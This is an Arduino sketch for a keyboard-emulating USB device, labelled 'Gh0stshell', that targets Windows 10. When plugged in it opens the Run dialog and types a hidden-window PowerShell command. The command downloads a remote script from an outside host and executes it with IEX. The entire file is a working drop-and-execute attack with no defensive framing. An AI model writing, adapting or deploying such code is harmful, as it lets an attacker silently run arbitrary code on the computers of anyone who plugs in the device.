/* 

Downloaded Powershell-Script and Execute it
Target OS: Windows10
Gh0stshell - wslab.de

*/

// Select Language
//#include "Keyboard.h"
#include "Keyboard_DE.h"

 
void setup() {
Keyboard.begin();
delay(3000);
Keyboard.press(KEY_LEFT_GUI);
delay(1000);
Keyboard.press('r');
Keyboard.releaseAll();
delay(300);
Keyboard.println("powershell.exe -windowstyle hidden \"IEX ((new-object net.webclient).downloadstring('http://wslab.de/payload_ssl.ps'))\"");
delay(500);
Keyboard.press(KEY_RETURN);
Keyboard.releaseAll();
//delay(60000);
}

void loop() {

}
